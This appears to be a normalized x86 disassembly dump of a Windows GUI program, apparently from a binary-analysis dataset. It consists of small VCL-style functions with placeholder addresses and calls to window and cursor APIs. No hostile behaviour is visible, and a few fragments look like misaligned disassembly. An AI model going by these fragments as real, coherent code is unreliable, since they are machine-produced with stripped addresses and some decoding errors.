mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403370
pop esi
retn
sub_44af10
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403370
pop esi
retn
sub_44af24
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_44af30
mov eax 0x4
retn
sub_44af38
retn
sub_44bb29
jmp sub_40363c
sub_44be16
jmp sub_4038f0
sub_44be88
jmp sub_4038f0
sub_44be94
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44bbbc
sub_44c013
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_424968
retn
sub_44c029
jmp sub_4038f0
sub_44c050
jmp sub_4038f0
sub_44c0d2
jmp sub_4038f0
sub_44c0fa
jmp sub_4038f0
sub_44c101
mov esp ebp
pop ebp
retn
sub_44c1b9
jmp sub_4038f0
sub_44c210
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44c1dc
mov [ ebx + 0x58 ] esi
sub_44c364
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_44c378
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44c461
jmp sub_4038f0
sub_44c468
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c4eb
jmp sub_4038f0
sub_44c4f2
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_44c8c0
xor eax eax
retn
sub_44c8c4
mov al [ eax + 0x58 ]
retn
sub_44c8c8
xor eax eax
retn
sub_44c8cc
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_44c8d4
mov eax [ eax + 0x30 ]
retn
sub_44c978
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_44ca24
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44ca3c
mov [ eax + 0x5d ] dl
retn
sub_44ca40
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_450620
sub_44ca50
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_44cf33
jmp sub_4038f0
sub_44cf3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44cf9c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_44d020
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_44d13d
jmp sub_4038f0
sub_44d144
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d240
push eax
xor ecx ecx
mov edx 0xb037
call sub_44e7e8
retn
sub_44d401
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403370
sub_44d4b2
jmp sub_4038f0
sub_44d4b9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44d590
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44e7e8
sub_44d5a8
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44e7e8
retn
sub_44d5b8
push edx
mov edx 0xd
call sub_44e7e8
retn
sub_44d5c4
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_44d5d8
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_44d6b9
jmp sub_4038f0
sub_44d6c0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d6c8
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44e7e8
sub_44d738
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_44d74c
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_44d758
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_44d760
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44e7e8
sub_44d784
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44e7e8
sub_44d7a8
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44e7e8
sub_44d7f0
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_44d7f8
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_44e7e8
sub_44d81c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44e7e8
sub_44d840
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44e7e8
sub_44d85c
push ebx
mov ebx eax
call sub_44a7dc
cmp ebx eax
sete al
pop ebx
retn
sub_44d894
push esi
mov dl 0x1
mov si 0xffce
call sub_403370
pop esi
retn
sub_44d9de
jmp sub_4038f0
sub_44d9e5
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44db08
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_44da7c
retn
sub_44db5c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_44db70
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_44dc55
jmp sub_4038f0
sub_44dc74
xor eax eax
retn
sub_44dc78
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44dc90
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44dca8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_44dcc4
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44dcdc
retn
sub_44dda0
retn
sub_44dda4
cmp eax [ rw-data ]
sete al
retn
sub_44de18
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_44df34
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403370
pop esi
pop ebp
retn 0x4
sub_44df74
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44e20b
jmp sub_4038f0
sub_44e212
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e21c
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403370
pop esi
retn
sub_44e230
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403370
pop esi
retn
sub_44e4ff
jmp sub_4038f0
sub_44e5a8
push esi
mov si 0xffee
call sub_403370
pop esi
retn
sub_44e5b4
mov al 0x1
retn
sub_44e88c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_44cc88
retn
sub_44e8b0
retn
sub_44eac9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c190
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44eae4
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41e648
retn
sub_44ebdc
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44f1f4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44f1fc
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44f204
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44f2bc
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44f2dc
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_44d784
mov [ ebx + 0x9a ] 0x1
sub_44f334
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_44d728
mov [ ebx + 0x56 ] 0x1
sub_44f358
mov [ edx + 0xc ] 0x1
retn
sub_44f360
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44e7e8
sub_44f378
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_44e7e8
sub_44f390
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44f5f6
jmp sub_4038f0
sub_44f5fd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f628
mov eax [ r-xdata ]
retn
sub_44f7c4
jmp sub_4038f0
sub_44f7cb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f8ec
mov eax [ eax + 0xb8 ]
retn
sub_44f954
push ebx
mov ebx eax
mov eax ebx
call sub_44dc78
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_44f970
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44fb08
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44fb38
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44fb40
call sub_44c6f4
retn
sub_44fc40
jmp sub_4038f0
sub_44fe00
jmp sub_4038f0
sub_44fe50
jmp sub_4038f0
sub_44fe88
retn
sub_450111
jmp sub_4038f0
sub_450299
jmp sub_4038f0
sub_4505fb
jmp sub_4038f0
sub_4506a7
jmp sub_4038f0
sub_4506b4
inc [ eax + 0x160 ]
retn
sub_4506bc
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_4506dc
sub_4506dc
xor edx edx
call sub_450620
retn
sub_4507a9
jmp sub_4038f0
sub_4507b0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45089f
jmp sub_4038f0
sub_450dc6
jmp sub_4038f0
sub_450dcd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450f95
jmp sub_4038f0
sub_450f9c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451070
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_45125d
jmp sub_4038f0
sub_451264
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_451354
xor eax eax
retn
sub_4513bc
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_44e7e8
sub_4514ea
jmp sub_40363c
sub_45161f
jmp sub_4038f0
sub_451626
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451630
jmp sub_40363c
sub_451635
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451bf0
jmp sub_4038f0
sub_451bf7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451c00
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_4520fe
jmp sub_4038f0
sub_452150
push ebx
mov ebx eax
call sub_423098
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_44e7e8
pop ebx
retn
sub_45216c
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_44e7e8
retn
sub_452180
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_44e7e8
retn
sub_452190
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_44e7e8
retn
sub_45243c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45412c
pop esi
retn
sub_452550
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4525a0
pop esi
retn
sub_452564
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_45268c
pop esi
retn
sub_452578
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45258c
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45267f
jmp sub_4038f0
sub_452686
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452716
jmp sub_4038f0
sub_45271d
pop ebx
pop ecx
pop ebp
retn
sub_452724
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_452734
retn
sub_452738
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_452758
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_4528b8
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_452988
retn
sub_452aa0
jmp sub_4038f0
sub_452aa7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452b72
jmp sub_4038f0
sub_452b9c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_452c2e
jmp sub_4038f0
sub_452e00
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_4530a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_453180
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_450bac
pop esi
retn
sub_453244
push esi
mov si 0xffc1
call sub_403370
pop esi
retn
sub_453270
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_453284
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_453298
call sub_450b6c
retn
sub_4532a0
call sub_450b6c
retn
sub_4532a8
call sub_450b6c
retn
sub_453350
push ebx
mov ebx eax
mov eax ebx
call sub_44f204
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_424210
mov dx 0xb009
mov eax ebx
call sub_450bac
pop ebx
retn
sub_4534b4
call sub_450b6c
retn
sub_4534bc
call sub_450b6c
retn
sub_4534c4
call sub_450b6c
retn
sub_4534cc
call sub_450b6c
retn
sub_453530
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4539c6
jmp sub_4038f0
sub_4539cd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453aac
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_453c50
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_44e7e8
retn
sub_453cf0
push ebx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_453d0c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_453ee4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_453e1c
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_453f3c
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e7e8
sub_453f5c
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_44e7e8
sub_453f80
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_453f8c
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_44e7e8
sub_454038
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_453fdc
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_454114
jmp sub_4038f0
sub_45411b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45433a
jmp sub_4038f0
sub_454341
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_454448
call sub_44e5b8
retn
sub_454896
jmp sub_4038f0
sub_45492c
mov eax [ r-xdata ]
retn
sub_454a93
jmp sub_4038f0
sub_454ba4
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e7e8
sub_454bc4
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44e7e8
sub_454eda
jmp sub_4038f0
sub_45501c
test [ eax + 0x52 ] 0x4
setne al
retn
sub_455178
jmp sub_4038f0
sub_45517f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424968
retn
sub_45519b
jmp sub_4038f0
sub_4551a8
retn
sub_45527c
mov [ edx + 0xc ] 0xffffffff
retn
sub_4552da
jmp sub_4038f0
sub_4552e1
pop ecx
pop ecx
pop ebp
retn
sub_455381
jmp sub_4038f0
sub_455388
pop ebx
mov esp ebp
pop ebp
retn
sub_4553f4
call sub_451374
retn
sub_455487
jmp sub_4038f0
sub_45548e
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_45566d
jmp sub_4038f0
sub_455674
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4557d0
push ebx
mov ebx eax
mov eax ebx
call sub_45a710
or edx 0xffffffff
mov eax ebx
call sub_4558fc
pop ebx
retn
sub_4558a8
jmp sub_4038f0
sub_4558fc
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_4557e8
sub_455a6c
push ebx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_455a84
push ebx
mov ebx eax
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_455b70
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_451fac
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_455c0b
jmp sub_4038f0
sub_455c12
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455c35
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424968
retn
sub_455c2e
jmp sub_4038f0
sub_455c35
pop ebx
pop ecx
pop ebp
retn
sub_455c3c
retn
sub_455ca4
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_456011
jmp sub_4038f0
sub_4561f8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_4563e4
jmp sub_4038f0
sub_456494
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_4564a8
inc [ eax + 0x6c ]
retn
sub_4564ac
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_457d2c
sub_45660c
call sub_456d0c
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_456fb7
jmp sub_4038f0
sub_456fbe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456fdb
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_456fd4
jmp sub_4038f0
sub_456fdb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4572bc
jmp sub_4038f0
sub_4572c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572e0
mov eax [ ebp - 0x4 ]
call sub_424968
retn
sub_4572d9
jmp sub_4038f0
sub_4572e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572fd
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_4572f6
jmp sub_4038f0
sub_4572fd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4577b1
jmp sub_4038f0
sub_4577b8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457943
jmp sub_4038f0
sub_45794a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4579ff
jmp sub_4038f0
sub_457a06
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457af4
jmp sub_4038f0
sub_457b45
jmp sub_4038f0
sub_457b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457c08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_456518
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_457d54
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_456054
sub_458654
jmp sub_4038f0
sub_45865b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458724
call GetCapture
retn
sub_45872c
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40cb2c
pop ebx
retn
sub_45873c
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_4589a2
jmp sub_4038f0
sub_458b9c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_458db0
jmp sub_4038f0
sub_458db7
pop ebx
mov esp ebp
pop ebp
retn
sub_458e02
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_458e7f
jmp sub_4038f0
sub_458e86
pop ebp
retn
sub_458f0e
jmp sub_4038f0
sub_458f15
pop ebp
retn
sub_459664
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_418304
retn
sub_45967c
mov al 0x1
retn
sub_459680
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_420df8
retn
mov eax edx
retn
sub_459690
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_420dc8
retn
mov al 0x1
retn
sub_459980
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4182a8
pop esi
pop ebx
retn
sub_459994
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_4599d0
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_459c34
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459c48
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459c5c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459c70
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459c84
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459c98
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459cac
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459cc0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459cd4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459ce8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
pop ebx
retn
sub_459cfc
retn
sub_459d00
retn
sub_459d04
retn
sub_459d08
retn
sub_459d0c
retn
sub_459d10
retn
